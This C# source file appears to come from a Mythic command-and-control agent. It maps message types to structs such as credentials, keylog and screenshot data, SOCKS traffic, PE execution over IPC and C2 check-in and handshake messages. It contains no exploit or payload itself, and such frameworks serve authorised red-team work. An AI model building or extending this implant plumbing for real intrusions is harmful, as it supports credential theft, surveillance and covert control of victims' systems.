﻿using SystemAgentInterop.Enums.SystemCoreEnums;
using SystemAgentInterop.Structs.SystemCoreStructs;
using SystemAgentInterop.Structs.MythicStructs;
using System;

namespace SystemAgentInterop.Types
{
    public static class MythicTypes
    {
        public static Type GetMessageType(MessageType msg)
        {
            if (msg == MessageType.C2ProfileData)
            {
                return typeof(SystemInterop.Structs.MythicStructs.C2ProfileData);
            }
            else if (msg == MessageType.Credential)
            {
                return typeof(Credential);
            }
            else if (msg == MessageType.RemovedFileInformation)
            {
                return typeof(RemovedFileInformation);
            }
            else if (msg == MessageType.FileInformation)
            {
                return typeof(FileInformation);
            }
            else if (msg == MessageType.FileBrowser)
            {
                return typeof(FileBrowser);
            }
            else if (msg == MessageType.EdgeNode)
            {
                return typeof(EdgeNode);
            }
            else if (msg == MessageType.SocksDatagram)
            {
                return typeof(SocksDatagram);
            }
            else if (msg == MessageType.Artifact)
            {
                return typeof(Artifact);
            }
            else if (msg == MessageType.TaskStatus)
            {
                return typeof(MythicTaskStatus);
            }
            else if (msg == MessageType.TaskResponse)
            {
                return typeof(MythicTaskResponse);
            }
            else if (msg == MessageType.Task)
            {
                return typeof(MythicTask);
            }
            else if (msg == MessageType.DelegateMessage)
            {
                return typeof(DelegateMessage);
            }
            else if (msg == MessageType.TaskingMessage)
            {
                return typeof(TaskingMessage);
            }
            else if (msg == MessageType.EKEHandshakeMessage)
            {
                return typeof(EKEHandshakeMessage);
            }
            else if (msg == MessageType.EKEHandshakeResponse)
            {
                return typeof(EKEHandshakeResponse);
            }
            else if (msg == MessageType.CheckinMessage)
            {
                return typeof(CheckinMessage);
            }
            else if (msg == MessageType.UploadMessage)
            {
                return typeof(UploadMessage);
            }
            else if (msg == MessageType.MessageResponse)
            {
                return typeof(MessageResponse);
            } else if (msg == MessageType.DownloadMessage)
            {
                return typeof(DownloadMessage);
            } else if (msg == MessageType.IPCCommandArguments)
            {
                return typeof(IPCCommandArguments);
            } else if (msg == MessageType.ExecutePEIPCMessage)
            {
                return typeof(ExecutePEIPCMessage);
            }
            else if (msg == MessageType.ScreenshotInformation)
            {
                return typeof(ScreenshotInformation);
            } else if (msg == MessageType.KeylogInformation)
            {
                return typeof(KeylogInformation);
            }
            else
            {
                throw new Exception($"Invalid MessageType: {msg}");
            }
        }
    }
}
